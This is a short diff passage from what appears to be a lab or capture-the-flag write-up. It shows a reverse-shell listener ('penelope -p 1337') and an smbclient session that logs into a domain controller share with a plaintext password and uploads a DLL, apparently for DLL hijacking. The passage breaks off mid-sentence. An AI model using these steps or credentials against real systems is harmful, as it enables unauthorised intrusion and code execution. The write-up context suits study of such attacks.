@@ -583,5 +583,9 @@ penelope -p 1337
 First ill start a listener
 
 ```python
-
+smbclient //dc1.dismay.hsm/Tools -U 'mike.silver'%'Password123!'
+Try "help" to get a list of possible commands.
+smb: \> put dismcore.dll 
+putting file dismcore.dll as \dismcore.dll (0.9 kB/s) (average 0.9 kB/s)
 ```
+This put the file in the share so now when the 
